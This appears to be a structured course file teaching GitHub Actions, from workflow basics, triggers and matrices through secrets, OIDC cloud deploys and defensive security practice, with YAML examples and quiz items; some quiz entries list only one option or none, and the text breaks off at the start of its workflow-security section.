tool.name: GitHub Actions
tool.tagline: CI/CD and automation built into GitHub, driven by YAML workflows
tool.description: GitHub Actions runs workflows defined as YAML files in your repository whenever something happens on GitHub: a push, a pull request, a schedule or a manual click. Teams use it to build and test every change, publish packages and deploy to the cloud. Because it lives next to the code and has a huge marketplace of reusable actions, it is the default CI/CD system for most projects hosted on GitHub.

concepts.name: What GitHub Actions is
concepts.summary: Workflows, events, jobs, steps and runners: the five words that describe every GitHub Actions setup.
concepts.why: You need the vocabulary before any YAML makes sense, and it tells you where each piece of work actually runs.
concepts.body:
**GitHub Actions** is GitHub's automation service. You describe automation in **workflow** files, YAML stored in `.github/workflows/` in the repository, and GitHub runs them when an **event** happens: a push, a pull request being opened, a release, a cron schedule or a manual button press.

A workflow contains one or more **jobs**. Each job runs on a **runner**, a fresh virtual machine (or container) that GitHub provisions for that job only: `ubuntu-latest`, `windows-latest` or `macos-latest`, or a machine you host yourself. Jobs run in parallel by default and do not share a file system.

A job is a list of **steps** executed in order on the same runner, so steps do share files. A step either runs a shell command (`run:`) or calls an **action** (`uses:`), a reusable unit such as `actions/checkout` that clones your repository.

- Event: what starts the workflow.
- Job: a group of steps on one runner.
- Step: one command or action.
- Runner: the machine that executes a job.

For public repositories the standard hosted runners are free; private repositories get a monthly allowance of minutes. Every run is shown in the repository's **Actions** tab with logs per step, and its status appears as a check on commits and pull requests, which is what makes Actions useful as CI.
concepts.code:
# .github/workflows/hello.yml
name: Hello              # shown in the Actions tab
on: push                 # event
jobs:
  greet:                 # job id
    runs-on: ubuntu-latest   # runner
    steps:
      - uses: actions/checkout@v7      # step using an action
      - run: echo "Hello from $GITHUB_REPOSITORY"   # step running a command
      - run: ls                         # sees the checked-out files
takeaways: Workflows are YAML files in .github/workflows/
An event starts a workflow; a workflow has jobs; a job has steps
Each job gets a fresh runner; steps in one job share its files
pitfalls: Expecting two jobs to see each other's files: they run on different machines.

quiz.q: Two steps in the same job and two jobs in the same workflow: which pair shares a file system?
quiz.explain: Steps run sequentially on one runner; each job gets its own fresh runner.

concepts.name: Your first workflow file
concepts.summary: Write a CI workflow that checks out the code, installs dependencies and runs the tests on every push and pull request.
concepts.why: A build-and-test workflow on every change is the single most valuable thing Actions does for a project.
concepts.body:
A workflow file has three top-level keys you will always write: `name` (optional label), `on` (the triggering events) and `jobs`.

Each job needs `runs-on`, the runner label, and `steps`. A typical CI job follows the same recipe in every language:

- `actions/checkout` to clone the commit that triggered the run (the runner starts empty).
- A `setup-*` action such as `actions/setup-node` or `actions/setup-python` to install a toolchain version.
- `run:` steps to install dependencies, lint and test.

A `run` step executes in `bash` on Linux and macOS runners (with `-e`, so the first failing command fails the step) and in PowerShell on Windows. A multi-line command uses the YAML block scalar `|`. Any step that exits non-zero fails the job, marks the run red and, by default, skips the remaining steps.

Commit the file and push: the run appears under the **Actions** tab within seconds. With `on: [push, pull_request]` the result also shows up as a check on pull requests, and branch protection can require it to pass before merging.

Steps can be given a `name` for readable logs and a `working-directory` when the project lives in a subfolder. Keep CI workflows fast and boring: the same commands a developer runs locally, in the same order.
concepts.code:
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: 22
      - name: Install
        run: npm ci
      - name: Lint and test
        run: |
          npm run lint
          npm test
takeaways: Checkout, set up a toolchain, then run your commands
A non-zero exit code fails the step and the job
Use | for multi-line run scripts
pitfalls: Forgetting actions/checkout and wondering why the repository files are missing.

quiz.q: A run step contains three commands on separate lines and the second one fails. What happens on a Linux runner?
options: The step fails at the second command and later steps are skipped
All three run and the step passes
Only the last command's exit code counts
quiz.explain: Linux run steps use bash with -e, so the first failing command fails the step, and following steps are skipped by default.

concepts.name: Using actions from the Marketplace
concepts.summary: Call reusable actions with uses:, pass them inputs with with:, and pin them to a version you trust.
concepts.why: Most workflow steps are someone else's action; knowing how to choose and pin them keeps builds stable and safe.
concepts.body:
An **action** is a reusable step published in a repository. You reference it as `owner/repo@ref`, for example `actions/checkout@v7`, and GitHub downloads it at the start of the job. The `ref` can be:

- a major version tag like `v5` (gets compatible updates automatically),
- an exact tag like `v5.0.0`,
- a full commit SHA, the only reference that cannot be moved by the action's owner.

Inputs go under `with:`; each action documents its inputs in its `action.yml` and README. Some actions also set **outputs** that later steps can read. A local action in your own repository is referenced by path: `uses: ./.github/actions/setup`.

`actions/checkout` deserves special attention. By default it fetches only the triggering commit (`fetch-depth: 1`), which is fast but means `git describe` or history-based tools see no history; set `fetch-depth: 0` for full history. It also persists the job's token so later steps can run authenticated git commands such as `git push`; set `persist-credentials: false` if they don't need to.

The `actions/` organization is maintained by GitHub. For third-party actions, check the source, the maintainer and how widely it is used: an action runs with access to your workspace and whatever secrets you pass it.
concepts.code:
steps:
  - uses: actions/checkout@v7
    with:
      fetch-depth: 0              # full history for git describe
      persist-credentials: false
  - run: git describe --tags --always   # e.g. v1.4.2-3-g1a2b3c4
  - uses: actions/setup-python@v7
    with:
      python-version: "3.13"
  # third-party action pinned to a full commit SHA (comment records the tag)
  - uses: owner/some-action@0123456789abcdef0123456789abcdef01234567 # v2.1.0
takeaways: uses: owner/repo@ref runs an action; with: passes inputs
Major tags auto-update; a full SHA pins exactly
checkout fetches one commit unless fetch-depth: 0
pitfalls: Quoting versions is needed for YAML: python-version: 3.10 becomes the number 3.1.

quiz.q: Which reference guarantees the action code cannot change under you?
quiz.explain: Branches and tags can be moved; a commit SHA identifies immutable content.

concepts.name: Triggers: push, pull_request, schedule, manual
concepts.summary: Control when a workflow runs with event filters on branches and paths, cron schedules and manual workflow_dispatch inputs.
concepts.why: Running the right workflow at the right time saves minutes and keeps deploys from firing on the wrong branch.
concepts.body:
The `on` key lists events, optionally with filters.

- `push` and `pull_request` accept `branches`, `tags` and `paths` filters (and `-ignore` variants). For `pull_request` the branch filter matches the **target** branch, so `branches: [main]` means "PRs into main".
- `pull_request` has activity `types`; the default is `opened`, `synchronize` (new commits) and `reopened`.
- `schedule` takes cron expressions in **UTC**, minimum every 5 minutes, and runs on the default branch only. Scheduled runs can start late under load.
- `workflow_dispatch` adds a **Run workflow** button (and API/CLI trigger) with optional typed `inputs`, read as `inputs.name`.
- Others include `release`, `workflow_run` (after another workflow finishes), `issues` and `repository_dispatch` for external webhooks.

Glob patterns in filters use `*` (no slash) and `**` (any depth). When both `branches` and `paths` are given, both must match.

A `pull_request` run checks out a temporary **merge commit** of the PR into the base branch, so tests see what main would look like after merging. Workflows triggered by pull requests from forks get a read-only token and no secrets, which is a deliberate safety measure.
concepts.code:
on:
  push:
    branches: [main, "release/**"]
    paths: ["src/**", "package.json"]
  pull_request:
    branches: [main]          # PRs targeting main
  schedule:
    - cron: "30 2 * * 1"      # Mondays 02:30 UTC
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]
        default: staging
jobs:
  show:
    runs-on: ubuntu-latest
    steps:
      - run: echo "event=${{ github.event_name }} env=${{ inputs.environment }}"
takeaways: push/pull_request filter on branches, tags and paths
Cron schedules are UTC and run on the default branch
workflow_dispatch adds a manual button with typed inputs
pitfalls: Expecting a schedule in a feature branch's workflow file to run: only the default branch's copy is used.

quiz.q: With on: pull_request: branches: [main], which PRs trigger the workflow?
options: PRs whose head branch is named main
quiz.explain: For pull_request events, the branches filter matches the base (target) branch.

concepts.name: Multiple jobs and needs
concepts.summary: Split a workflow into parallel jobs and order them with needs to build a simple pipeline.
concepts.why: Real pipelines lint, test and deploy in separate jobs; needs is how you express what waits for what.
concepts.body:
Jobs in a workflow start **in parallel**. To order them, a job lists the jobs it depends on in `needs`. GitHub builds a graph from these edges: a job starts when all of its needs have succeeded, and if one of them fails the dependent job is **skipped**.

```yaml
deploy:
  needs: [lint, test]
```

Because each job runs on a fresh runner, anything a later job needs must be passed explicitly: build files go through **artifacts**, small values through **job outputs**, both covered later. Each job also re-checks out the code.

Useful job-level keys:

- `runs-on`: different jobs can use different operating systems.
- `timeout-minutes`: the default is 360 minutes, far too long for most CI. Set something realistic.
- `if:`: skip the job conditionally, for example only deploy from `main`.
- `continue-on-error: true`: let the workflow succeed even if this job fails (for experimental checks).
- `container:` and `services:`: run the job inside a Docker image, or start side containers such as a database for tests (Linux runners only).

The Actions UI draws the graph, so a good structure doubles as documentation: fast checks first, slow or privileged jobs only after them.
concepts.code:
jobs:
  lint:
    runs-on: ubuntu-latest
    steps: [{uses: actions/checkout@v7}, {run: make lint}]
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    services:
      postgres:
        image: postgres:17
        env: {POSTGRES_PASSWORD: pw}
        ports: ["5432:5432"]
    steps: [{uses: actions/checkout@v7}, {run: make test}]
  deploy:
    needs: [lint, test]        # waits for both; skipped if either fails
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps: [{run: echo deploying}]
takeaways: Jobs run in parallel unless needs orders them
A failed dependency skips the dependent job
Set timeout-minutes; the default is 6 hours
pitfalls: Writing files in one job and expecting the next job to find them on disk.

quiz.q: Job C has needs: [A, B]. A succeeds, B fails. What happens to C?
options: C waits until B is re-run
quiz.explain: By default a job only runs when all of its needs succeeded.

concepts.name: Environment and configuration variables
concepts.summary: Set env at workflow, job and step level, read GitHub's default variables, and store non-secret settings as configuration variables.
concepts.why: Almost every workflow needs settings and runtime facts like the branch or commit, and env is how scripts receive them.
concepts.body:
The `env` key defines environment variables at three scopes: workflow, job and step. The narrowest scope wins. Inside `run:` scripts they are ordinary shell variables (`$NAME` in bash).

GitHub also sets **default variables** on every runner, including:

- `GITHUB_SHA`: the commit being built.
- `GITHUB_REF` and `GITHUB_REF_NAME`: e.g. `refs/heads/main` and `main`.
- `GITHUB_REPOSITORY`, `GITHUB_RUN_ID`, `GITHUB_WORKSPACE` (the checkout directory), `RUNNER_OS`.
- `CI=true`, which many tools use to switch to non-interactive mode.

There are two ways to refer to a value. `$GITHUB_SHA` is expanded by the **shell** on the runner. `${{ github.sha }}` is an **expression** that GitHub substitutes into the YAML before the step runs; expressions are needed where no shell is involved, such as in `with:` inputs or `if:` conditions.

For settings that differ per repository or environment but are not secret (a region, an app name), use **configuration variables** defined under Settings, Secrets and variables, Actions, Variables. Read them as `${{ vars.NAME }}`. They can be set at organization, repository or environment level. Anything sensitive belongs in secrets instead.
concepts.code:
env:                        # whole workflow
  APP: shop
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      STAGE: test             # this job
    steps:
      - run: echo "$APP $STAGE on $GITHUB_REF_NAME at ${GITHUB_SHA::7}"
        # shop test on main at 1a2b3c4
      - run: echo "$STAGE"    # prod (step scope wins)
        env:
          STAGE: prod
      - uses: actions/setup-node@v7
        with:
          node-version: ${{ vars.NODE_VERSION }}   # repo configuration variable
takeaways: env at workflow, job or step scope; the narrowest wins
$VAR is expanded by the shell, ${{ }} by GitHub before the step runs
vars.* holds non-secret settings; secrets.* holds sensitive ones
pitfalls: Using $VAR inside with: inputs: no shell runs there, so it stays a literal string.

quiz.q: Where must you use ${{ env.X }} instead of $X?
options: In a with: input of an action
quiz.explain: with: values are not processed by a shell, so only expression syntax is substituted.

concepts.name: Expressions, contexts and if conditions
concepts.summary: Use ${{ }} expressions with the github, env, steps and needs contexts, and status functions like failure() in if conditions.
concepts.why: Conditions and context data are how one workflow behaves differently for PRs, branches and failures.
concepts.body:
An **expression** `${{ ... }}` is evaluated by GitHub, not by the shell. It can read **contexts**, objects describing the run:

- `github`: event name, ref, sha, actor, repository and the full webhook payload in `github.event`.
- `env`, `vars`, `secrets`, `inputs`: values you defined.
- `steps.<id>.outputs` and `steps.<id>.outcome`: results of earlier steps (give the step an `id`).
- `needs.<job>.outputs` and `needs.<job>.result`: results of jobs listed in `needs`.
- `matrix`, `runner`, `job`.

Expressions support `==`, `!=`, `&&`, `||`, `!` and functions such as `contains()`, `startsWith()`, `format()`, `join()`, `toJSON()`, `fromJSON()` and `hashFiles()`. String comparison is case-insensitive.

In `if:` keys the `${{ }}` wrapper is optional. A step's `if` implicitly includes `success()`, meaning "all previous steps succeeded". The **status functions** change that:

- `failure()`: run only if an earlier step failed (notifications, uploading logs).
- `always()`: run regardless, even after cancellation.
- `cancelled()`: run only when the run was cancelled.
- `!cancelled()`: run after success or failure but not cancellation, usually better than `always()` for cleanup.

Debugging tip: dump a context with `echo '${{ toJSON(github.event) }}'` to see exactly what you can use, but never do this with `secrets`.
concepts.code:
steps:
  - id: tests
    run: npm test
  - if: failure() && steps.tests.outcome == 'failure'
    run: echo "Tests failed on ${{ github.ref_name }}"
  - if: github.event_name == 'pull_request' && contains(github.event.pull_request.labels.*.name, 'preview')
    run: echo "Building preview for PR ${{ github.event.number }}"
  - if: ${{ !cancelled() }}
    run: echo "always tidy up (unless cancelled)"
  - if: startsWith(github.ref, 'refs/tags/v')
    run: echo "release ${{ github.ref_name }}"
takeaways: Contexts expose the event, steps, needs, matrix and your variables
if: implies success() unless you use a status function
Prefer !cancelled() to always() for cleanup steps
pitfalls: Writing if: ! startsWith(...) without ${{ }}: a leading ! is YAML syntax, so wrap it in ${{ }}.

quiz.q: A step has if: github.ref == 'refs/heads/main'. An earlier step failed. Does it run?
options: No, because success() is implied and an earlier step failed
Yes, the condition is true on main
Only if continue-on-error is set on the job
It runs but is marked skipped
quiz.explain: Unless a status function is used, success() is added implicitly to every if condition.

concepts.name: Secrets, GITHUB_TOKEN and permissions
concepts.summary: Store credentials as encrypted secrets, use the automatic GITHUB_TOKEN, and restrict its permissions.
concepts.why: Deploying or publishing needs credentials, and leaking or over-privileging them is the biggest CI security risk.
concepts.body:
**Secrets** are encrypted values stored at organization, repository or environment level. Read them as `${{ secrets.NAME }}` and pass them to steps through `env` or `with`. GitHub masks secret values in logs, printing `***` if they appear verbatim. Masking cannot catch transformed values (base64 encoded, split), so never print or echo secrets.

Every job also receives a **GITHUB_TOKEN**, an installation token created for that job that expires when the job finishes. It authenticates `git push`, the `gh` CLI and the REST API against the current repository: `${{ secrets.GITHUB_TOKEN }}` or `${{ github.token }}`.

Its rights are set by the `permissions` key, at workflow or job level. Once you specify `permissions`, every scope you don't list becomes `none`. Best practice is to start from `contents: read` and grant per job only what is needed, for example `pull-requests: write` to comment on PRs or `packages: write` to push images to GHCR. New repositories default to a read-only token.

Security rules worth remembering:

- Pull requests from forks get no secrets and a read-only token.
- Events created with the GITHUB_TOKEN (such as a push) do not trigger new workflow runs, which prevents infinite loops. Use a GitHub App token if you need that.
- Secrets are not available in `if:` conditions directly; check them via an env variable.
concepts.code:
permissions:
  contents: read              # default for every job in this workflow
jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write    # only this job may write to PRs
    steps:
      - run: gh pr comment "$PR" --body "Build passed"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR: ${{ github.event.pull_request.html_url }}
      - run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.DEPLOY_API_KEY }}   # shown as *** if printed
takeaways: secrets.* are encrypted, masked in logs and absent for fork PRs
GITHUB_TOKEN is per-job and short-lived; scope it with permissions
Listing permissions sets every unlisted scope to none
pitfalls: Relying on masking: an encoded or partial secret is printed in clear text.

quiz.q: Your workflow pushes a commit using GITHUB_TOKEN. Will that push trigger your on: push workflows?
options: Only if the workflow has permissions: write-all
No, events made with GITHUB_TOKEN don't start new runs
quiz.explain: GitHub suppresses workflow triggers from GITHUB_TOKEN actions to avoid recursive runs.

concepts.name: Step outputs, job outputs and summaries
concepts.summary: Pass values between steps with GITHUB_OUTPUT and GITHUB_ENV, between jobs with job outputs, and write a run summary.
concepts.why: Pipelines constantly need to hand a computed version, tag or path to the next step or job.
concepts.body:
Steps communicate by appending to special files whose paths GitHub puts in environment variables:

- `GITHUB_OUTPUT`: `echo "name=value" >> "$GITHUB_OUTPUT"` sets an output of the current step, read later as `steps.<id>.outputs.name`.
- `GITHUB_ENV`: `echo "NAME=value" >> "$GITHUB_ENV"` makes `NAME` an environment variable for all **following** steps of the job (not the current one).
- `GITHUB_PATH`: append a directory to put it on `PATH` for later steps.
- `GITHUB_STEP_SUMMARY`: Markdown appended here appears on the run's summary page; great for test reports.

To pass a value to another job, declare it under the job's `outputs`, mapping it from a step output, then read it in the dependent job as `needs.<job>.outputs.<name>`. Job outputs are strings, limited to 1 MB per job; use artifacts for files.

Multi-line values need a delimiter syntax:

```bash
{ echo "notes<<EOF"; cat notes.txt; echo "EOF"; } >> "$GITHUB_OUTPUT"
```

The old `::set-output` workflow command is deprecated; always use the files above. Outputs that contain secrets are masked and may be dropped when passed between jobs.
concepts.code:
jobs:
  version:
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.v.outputs.tag }}      # expose step output as job output
    steps:
      - id: v
        run: echo "tag=v1.$GITHUB_RUN_NUMBER" >> "$GITHUB_OUTPUT"
      - run: echo "BUILT_AT=$(date -u +%F)" >> "$GITHUB_ENV"
      - run: echo "### Built ${{ steps.v.outputs.tag }} on $BUILT_AT" >> "$GITHUB_STEP_SUMMARY"
  publish:
    needs: version
    runs-on: ubuntu-latest
    steps:
      - run: echo "Publishing ${{ needs.version.outputs.tag }}"   # Publishing v1.42
takeaways: Step output: append name=value to $GITHUB_OUTPUT
GITHUB_ENV affects later steps only
Cross-job values go through job outputs and needs.<job>.outputs
pitfalls: Reading a GITHUB_ENV variable in the same step that set it: it is only visible from the next step.

quiz.q: How does job B read output tag set by a step in job A?
options: needs.A.outputs.tag, after A maps it under outputs:
quiz.explain: Job A must declare the job output, and B must list A in needs.

concepts.name: Matrix builds
concepts.summary: Run one job definition across many combinations of OS, language versions and settings with strategy.matrix.
concepts.why: Testing every supported platform and version by hand is impossible; a matrix does it in parallel from a few lines.
concepts.body:
`strategy.matrix` turns one job into many. Each key is a variable with a list of values, and GitHub creates one job per combination, reading values as `${{ matrix.<key> }}`.

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest, macos-latest]
    node: [22, 24]
```

That is 3 x 2 = 6 jobs. Fine-tuning:

- `include`: add extra combinations or add keys to matching ones (for example an `experimental: true` flag).
- `exclude`: drop specific combinations.
- `fail-fast` (default `true`): cancel the remaining matrix jobs when one fails. Set `false` to see every failure.
- `max-parallel`: limit how many run at once.

A matrix can generate up to 256 jobs per workflow run. Name the job with matrix values, `name: test (${{ matrix.os }}, node ${{ matrix.node }})`, so failures are readable. If branch protection requires a check, it must name the exact job names produced by the matrix.

The matrix can also be **dynamic**: one job computes a JSON list and outputs it, and the next uses `matrix: ${{ fromJSON(needs.plan.outputs.targets) }}`, which is how monorepos test only the packages that changed.
concepts.code:
jobs:
  test:
    name: test (${{ matrix.os }}, py ${{ matrix.python }})
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest]
        python: ["3.13", "3.14"]
        exclude:
          - os: macos-latest
            python: "3.13"
        include:
          - os: ubuntu-latest
            python: "3.15"
            experimental: true
    continue-on-error: ${{ matrix.experimental == true }}
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v7
        with: {python-version: "${{ matrix.python }}"}
      - run: python -m pytest       # 4 jobs in total
takeaways: Each matrix combination is a separate parallel job
include adds or extends combinations; exclude removes them
fail-fast: false shows every failing combination
pitfalls: Unquoted versions like 3.10 become the number 3.1 in YAML.

quiz.q: matrix: os: [a, b], v: [1, 2, 3] with exclude of one combination. How many jobs run?
quiz.explain: 2 x 3 = 6 combinations, minus one excluded, gives 5 jobs.

concepts.name: Caching dependencies and sharing artifacts
concepts.summary: Speed up builds with actions/cache or setup-* caching, and hand files between jobs or to people with artifacts.
concepts.why: Caching often halves CI time, and artifacts are the only way to pass build output between jobs.
concepts.body:
**Caches** and **artifacts** both store files, for different purposes.

A **cache** is an optimization: dependencies that can be recreated if missing. `actions/cache` saves a path under a `key` at the end of a job and restores it at the start of later runs. Build the key from a hash of the lockfile, `${{ runner.os }}-npm-${{ hashFiles('package-lock.json') }}`, so it changes when dependencies change. `restore-keys` lists prefixes to fall back to a partial match. Easier still, most `setup-*` actions have a built-in `cache:` input. Caches are scoped to a branch with fallback to the default branch, evicted after 7 days unused, and limited in total size per repository.

An **artifact** is an output: build results, test reports, coverage. `actions/upload-artifact` stores files with the run; `actions/download-artifact` fetches them in a later job of the same run, and people can download them from the run page. Set `retention-days` to control storage costs. Since v4, artifact names must be unique within a run, so matrix jobs should include the matrix values in the name.

Rule of thumb: if losing it only makes the build slower, it's a cache; if a later job or a human needs it, it's an artifact.
concepts.code:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with: {node-version: 22, cache: npm}   # caches ~/.npm by lockfile hash
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v7
        with:
          name: dist
          path: dist/
          retention-days: 5
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v8
        with: {name: dist, path: dist}
      - run: ls dist          # index.html assets/ ...
takeaways: Cache = recreatable dependencies keyed by a lockfile hash
Artifact = outputs passed to later jobs or people
setup-* actions have a built-in cache input
pitfalls: Caching node_modules instead of the package manager's download cache, which breaks across Node versions.

quiz.q: Which belongs in an artifact rather than a cache?
options: Compiled binaries the deploy job must ship
quiz.explain: Build outputs needed by another job must be passed as artifacts; caches may be evicted at any time.

concepts.name: Reusable workflows
concepts.summary: Share whole pipelines across repositories with workflow_call, typed inputs, secrets and outputs.
concepts.why: Organizations with dozens of repositories need one maintained CI definition instead of copy-pasted YAML.
concepts.body:
A **reusable workflow** is an ordinary workflow file whose trigger is `on: workflow_call`. Another workflow calls it at the **job** level, not as a step:

```yaml
jobs:
  ci:
    uses: my-org/ci-templates/.github/workflows/node.yml@v3
    with: {node-version: 22}
    secrets: inherit
```

The callee declares typed `inputs` (string, number, boolean), the `secrets` it expects, and `outputs` mapped from its own jobs. The caller passes secrets explicitly or with `secrets: inherit`, which forwards all of the caller's secrets.

Things to know:

- The called workflow's jobs appear in the caller's run, named `caller-job / callee-job`.
- Calls can nest up to ten levels deep, and a run can involve at most 50 unique reusable workflows.
- `env` from the caller is **not** propagated; use inputs.
- The `GITHUB_TOKEN` permissions can only be reduced by the called workflow, never elevated.
- Reference with `@tag` or `@sha` like actions; a same-repository workflow can use `./.github/workflows/x.yml`.

Reusable workflows vs **composite actions**: a reusable workflow contains whole jobs with their own runners, environments and secrets; a composite action bundles steps inside one job. Use the workflow for "the standard CI pipeline", the action for "set up our toolchain".
concepts.code:
# .github/workflows/build.yml in my-org/ci-templates
on:
  workflow_call:
    inputs:
      node-version: {type: string, default: "22"}
    secrets:
      NPM_TOKEN: {required: false}
    outputs:
      artifact: {value: "${{ jobs.build.outputs.name }}"}
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      name: ${{ steps.n.outputs.name }}
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with: {node-version: "${{ inputs.node-version }}"}
      - run: npm ci && npm test
        env: {NODE_AUTH_TOKEN: "${{ secrets.NPM_TOKEN }}"}
      - id: n
        run: echo "name=build-${{ github.sha }}" >> "$GITHUB_OUTPUT"
takeaways: on: workflow_call makes a workflow callable at job level
Inputs, secrets and outputs form its typed interface
Reusable workflow = whole jobs; composite action = steps
pitfalls: Expecting the caller's env values to reach the reusable workflow; pass them as inputs.

quiz.q: Where do you put uses: org/repo/.github/workflows/ci.yml@v1?
options: Directly on a job, instead of runs-on and steps
quiz.explain: Reusable workflows are called by a job; they bring their own jobs and runners.

concepts.name: Writing custom actions
concepts.summary: Package steps as a composite, JavaScript or Docker container action with an action.yml metadata file.
concepts.why: When the same setup or logic repeats in many workflows, an action gives it a name, inputs and a version.
concepts.body:
An action is a directory (or repository) with an `action.yml` describing its `name`, `inputs`, `outputs` and how it `runs`. There are three kinds:

- **Composite**: `runs.using: composite` and a list of steps, the same syntax as a job's steps. Each `run` step must declare its `shell`. Simplest option; good for bundling setup commands.
- **JavaScript**: `runs.using: node24` with a `main` file. It runs directly on the runner, starts fast and works on all operating systems. Use the `@actions/core` toolkit for inputs, outputs and logging, and commit a bundled `dist/` since the runner does not install dependencies.
- **Docker container**: `runs.using: docker` with a Dockerfile or image. Any language, but Linux runners only and slower to start.

Inputs reach composite steps as `${{ inputs.name }}`, and JavaScript/Docker actions as `INPUT_<NAME>` environment variables. Outputs work like step outputs: write to `$GITHUB_OUTPUT` and map them in `action.yml`.

Store actions used by one repository in `.github/actions/<name>/` and reference them as `./.github/actions/<name>` after checkout. Publish shared actions in their own repository with semantic version tags and a moving major tag (`v1`) so users get fixes automatically.
concepts.code:
# .github/actions/setup-app/action.yml
name: Setup app
description: Install toolchain and dependencies
inputs:
  node-version:
    description: Node.js version
    default: "22"
outputs:
  cache-hit:
    description: Whether dependencies came from cache
    value: ${{ steps.setup.outputs.cache-hit }}
runs:
  using: composite
  steps:
    - id: setup
      uses: actions/setup-node@v7
      with: {node-version: "${{ inputs.node-version }}", cache: npm}
    - run: npm ci
      shell: bash
# usage in a workflow, after actions/checkout:
#   - uses: ./.github/actions/setup-app
#     with: {node-version: "24"}
takeaways: action.yml defines inputs, outputs and runs
Composite actions bundle steps; each run step needs shell:
JavaScript actions are fast and cross-platform; Docker actions are Linux-only
pitfalls: Forgetting to commit the bundled dist/ of a JavaScript action; node_modules are never installed on use.

quiz.q: Which action type cannot run on a macOS runner?
quiz.explain: Docker container actions require a Linux runner with Docker.

concepts.name: Environments, approvals and concurrency
concepts.summary: Gate deployments with environments and required reviewers, and stop overlapping runs with concurrency groups.
concepts.why: Safe continuous deployment needs approvals, per-environment secrets and a guarantee two deploys never race.
concepts.body:
An **environment** (Settings, Environments) represents a deployment target such as `staging` or `production`. A job opts in with `environment: production`, and the environment can enforce **protection rules** before the job starts:

- **Required reviewers**: the job waits until a listed person or team approves.
- **Wait timer**: delay the job by up to 30 days.
- **Deployment branches and tags**: only allow, say, `main` and `v*` tags to deploy.

Environments also hold their own **secrets and variables**, which are only exposed to jobs referencing that environment. Combined with branch rules, this means a workflow on a feature branch cannot read production credentials. Deployments appear on the repository page with links to `environment.url`.

**Concurrency** controls overlapping runs. All runs or jobs with the same `concurrency.group` string form a queue where at most one runs and at most one waits; a newer pending run replaces the older pending one. `cancel-in-progress: true` cancels the running one instead, ideal for PR builds where only the latest commit matters. For deployments use `cancel-in-progress: false` so a half-finished deploy is never killed.

Typical groups: `${{ github.workflow }}-${{ github.ref }}` for CI, and a fixed `deploy-production` for deploys.
concepts.code:
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
jobs:
  deploy:
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://shop.example.com
    concurrency:
      group: deploy-production
      cancel-in-progress: false      # never kill a running deploy
    steps:
      - run: ./deploy.sh
        env:
          TOKEN: ${{ secrets.PROD_DEPLOY_TOKEN }}   # environment secret
takeaways: environment: gates a job with reviewers, timers and branch rules
Environment secrets are only visible to jobs in that environment
concurrency groups serialize runs; cancel-in-progress kills the running one
pitfalls: Using cancel-in-progress: true on deploy jobs, leaving systems half-deployed.

quiz.q: Three pushes arrive quickly for a group without cancel-in-progress. What happens?
options: Run 1 continues, run 2 is replaced by run 3 in the queue, run 3 runs after 1
All three run one after another
quiz.explain: A concurrency group holds one running and one pending entry; a newer pending run cancels the older pending one.

concepts.name: Keyless cloud deploys with OIDC
concepts.summary: Let workflows assume cloud roles with short-lived OpenID Connect tokens instead of stored access keys.
concepts.why: Long-lived cloud keys in secrets are the most common credential leak; OIDC removes them entirely.
concepts.body:
With **OpenID Connect**, a job asks GitHub for a signed JSON Web Token describing itself: repository, ref, environment, workflow and more. Your cloud provider is configured to trust GitHub's token issuer (`https://token.actions.githubusercontent.com`) and exchanges a valid token for short-lived cloud credentials. No access keys are stored in GitHub at all.

To use it:

- Grant the job `permissions: id-token: write` (plus `contents: read` for checkout).
- In the cloud, create a trust relationship: an AWS IAM OIDC provider and role, an Azure federated credential, or a GCP workload identity pool.
- Use the provider's login action, such as `aws-actions/configure-aws-credentials` with `role-to-assume`.

The security lives in the **trust policy conditions** on the token's claims. The key claim is `sub`, for example `repo:my-org/shop:environment:production` or `repo:my-org/shop:ref:refs/heads/main`. Always restrict `sub` to your repository and a specific branch or environment; a policy that only checks the audience would let any GitHub repository assume your role.

Credentials typically last an hour and die with the job, so a leaked log or compromised dependency gets far less than a permanent key would give.
concepts.code:
permissions:
  id-token: write     # allow requesting the OIDC token
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
          aws-region: eu-central-1
      - run: aws sts get-caller-identity   # assumed-role/gha-deploy/...
# AWS trust policy condition (excerpt):
# "token.actions.githubusercontent.com:sub": "repo:my-org/shop:environment:production"
takeaways: OIDC exchanges a signed per-job token for short-lived cloud credentials
Requires permissions: id-token: write
Lock the trust policy to repo and branch or environment via the sub claim
pitfalls: A trust policy that checks only aud, not sub, trusts every repository on GitHub.

quiz.q: What prevents another GitHub repository from assuming your OIDC-trusted AWS role?
options: Masking of the token in logs
A trust policy condition on the token's sub claim
quiz.explain: The sub claim identifies the repository and ref or environment; the cloud trust policy must check it.

concepts.name: Workflow security: injection and untrusted code
concepts.summary: Avoid script injection, the pull_request_target trap, unpinned actions and over-broad tokens.
concepts.why: CI holds deploy credentials and write access, so a workflow vulnerability is a supply-chain vulnerability.
concepts.body:
Most real Actions compromises come from a few patterns.

